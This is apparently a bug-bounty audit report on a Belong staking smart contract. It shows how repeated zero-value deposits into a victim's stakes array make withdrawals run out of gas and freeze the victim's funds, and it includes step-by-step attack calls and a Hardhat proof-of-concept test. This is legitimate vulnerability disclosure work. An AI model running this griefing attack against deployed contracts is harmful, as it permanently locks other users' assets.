# 57615 sc medium permanent freezing of user assets in staking sol&#x20;

**Submitted on Oct 27th 2025 at 16:03:34 UTC by @DoD4uFN for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57615
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

### Brief / Intro

A malicious actor can permanently freeze other users’ staked assets in the `Staking` contract by exploiting unbounded iteration in withdrawal logic. The vulnerability occurs because stakes are stored in an ever-growing array and iterated over on every `withdraw` and `emergencyWithdraw`. By strategically inserting thousands of zero-value stakes, an attacker can cause all withdrawal-related transactions for a victim to run out of gas, resulting in permanently frozen funds for affected users.

### Vulnerability Details

The `Staking` contract maintains a list of `Stake` structs per user in a dynamic array:

```solidity
mapping(address staker => Stake[]) public stakes;
```

Each time a user deposits, a new `Stake` entry is appended:

```solidity
function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
    super._deposit(by, to, assets, shares);
    stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
}
```

During withdrawals, the `_consumeUnlockedSharesOrRevert` and `_removeAnySharesFor` functions iterate over the entire `stakes[staker]` array, performing swap-and-pop operations to consume unlocked stakes:

```solidity
for (uint256 i; i < userStakes.length && remaining > 0;) {
    Stake memory s = userStakes[i];
    ...
    if (take == s.shares) {
        userStakes[i] = userStakes[userStakes.length - 1];
        userStakes.pop();
    } else {
        userStakes[i].shares = s.shares - take;
        remaining = 0;
        ++i;
    }
}
```

Since there are no bounds or gas-efficiency constraints on the array length, the time complexity grows linearly with the number of stakes. A malicious user can exploit this by depositing a large number of zero-value stakes into another user’s `stakes` array (possible in the current implementation).

When the victim later attempts to withdraw, the function will attempt to iterate through thousands of stakes, ultimately exceeding the block gas limit and reverting. This creates a permanent denial of service: the victim’s withdrawal (and `emergencyWithdraw`) will consistently revert, effectively freezing their assets indefinitely.

Exploitability is worsened because the attacker spends no tokens to bloat another user’s stakes array with many entries of zero value.

## Exploitation Steps

{% stepper %}
{% step %}

### Step

Attacker deposits `0` tokens at least once before the victim's legitimate deposit:

```js
await staking.connect(attacker).deposit(0, victim.address);
```

{% endstep %}

{% step %}

### Step

Victim deposits tokens at some point in time:

```js
await staking.connect(victim).deposit(ethers.utils.parseEther("500"), victim.address);
```

{% endstep %}

{% step %}

### Step

Attacker deposits `0` tokens multiple times using `staking.deposit(0, victimAddress)`. Around 3,500 deposits were sufficient to exceed typical Ethereum block gas limits in testing.

```js
for (let i = 0; i < 3500; i++) {
    await staking.connect(attacker).deposit(0, victim.address);
}
```

{% endstep %}

{% step %}

### Step

Victim calls `withdraw()` or `emergencyWithdraw()`; the loop in `_consumeUnlockedSharesOrRevert` runs out of gas before completing and the transaction reverts, leaving the victim unable to access their staked funds.
{% endstep %}
{% endstepper %}

***

## Impact Details

Impact: Permanent freezing of assets

An attacker can target any staker by bloating their stakes array with 0-amount deposits. Once the gas cost exceeds the block gas limit, the victim’s withdrawal and emergency withdrawal functions will always revert, regardless of the gas limit provided. In testing, approximately 3,500 zero-amount deposits were sufficient to cause a revert on Ethereum mainnet gas limits.

As a result, users’ tokens become permanently locked in the contract, and no administrative mechanism exists to clean or reset stake entries.

This impact qualifies as "Permanent freezing of user funds", which is a Critical severity according to Immunefi’s impact classification.

## References

* `Staking.sol`: pushing new entries to `stakes`\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol#L245>
* `Staking.sol`: iterating over all entries of `stakes` at withdraw\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol#L258-L290>
* `Staking.sol`: iterating over all entries of `stakes` at emergencyWithdraw\
  <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol#L296-L315>

***

## Proof of Concept

### Proof of Concept (coded)

Add the following PoC at `test/v2/platform/staking.test.ts` in `Staking features`.

```typescript
    it('Critical Permanent Asset Freeze PoC', async () => {
      const { staking, long, admin, minter, user1, user2 } = await loadFixture(fixture);

      const amount = ethers.utils.parseEther('500');

      await long.connect(admin).transfer(user1.address, amount);
      await long.connect(admin).transfer(user2.address, amount);
      await long.connect(user1).approve(staking.address, amount);

      // user 2 maliciously calls deposit so that the `stakes` array first element has a stake with 0 amount.
      const amount2 = ethers.utils.parseEther('0');
      const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
      await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);

      // user 1 stakes normally
      const tx = await staking.connect(user1).deposit(amount, user1.address);
      await expect(tx).to.emit(staking, 'Deposit').withArgs(user1.address, user1.address, amount, amount);
      expect((await staking.stakes(user1.address, 1)).shares).to.eq(amount);

      // user 2 maliciously calls deposit enough times so that it bloats the `stakes` array

      // here we split the deposits so that we don't get limited by the rpc
      let iterations = 1000
      for (let i = 0; i < iterations; i++) {
        const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
        await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);
      }
      
      console.log("Iterations done, timing out");
      await new Promise(r => setTimeout(r, 2000));

      for (let i = 0; i < iterations; i++) {
        const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
        await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);
      }

      console.log("Iterations done, timing out");
      await new Promise(r => setTimeout(r, 2000));


      iterations = 500
      for (let i = 0; i < iterations; i++) {
        const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
        await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);
      }

      console.log("Iterations done, timing out");
      await new Promise(r => setTimeout(r, 2000));

      for (let i = 0; i < iterations; i++) {
        const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
        await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);
      }

      console.log("Iterations done, timing out");
      await new Promise(r => setTimeout(r, 15000));

      for (let i = 0; i < iterations; i++) {
        const tx2 = await staking.connect(user2).deposit(amount2, user1.address);
        await expect(tx2).to.emit(staking, 'Deposit').withArgs(user2.address, user1.address, amount2, amount2);
      }

      console.log("Iterations done!");

      await staking.connect(admin).setMinStakePeriod(1);
      
      // User1 tries to withdraw but it reverts
      await expect(staking.connect(user1).withdraw(amount, user1.address, user1.address)).to.be.reverted;

      // here it crashes, that's why we added gasLimit 100m
      const gasEstimate = await staking.connect(user1).estimateGas.withdraw(amount, user1.address, user1.address, { gasLimit: 100_000_000 });
      console.log("gasEstimate : ", gasEstimate.toString());
      
    });
```

### Proof of Concept (in steps)

{% stepper %}
{% step %}

### Step

Attacker creates initial zero stake before victim:

```js
await staking.connect(attacker).deposit(0, victim.address);
```

{% endstep %}

{% step %}

### Step

Victim stakes normally:

```js
await staking.connect(victim).deposit(ethers.utils.parseEther("500"), victim.address);
```

{% endstep %}

{% step %}

### Step

Attacker floods victim’s stakes array:

```js
for (let i = 0; i < 3500; i++) {
    await staking.connect(attacker).deposit(0, victim.address);
}
```

{% endstep %}

{% step %}

### Step

Victim attempts to withdraw:

```js
await expect(
    staking.connect(victim).withdraw(ethers.utils.parseEther("500"), victim.address, victim.address)
).to.be.reverted;
```

{% endstep %}
{% endstepper %}
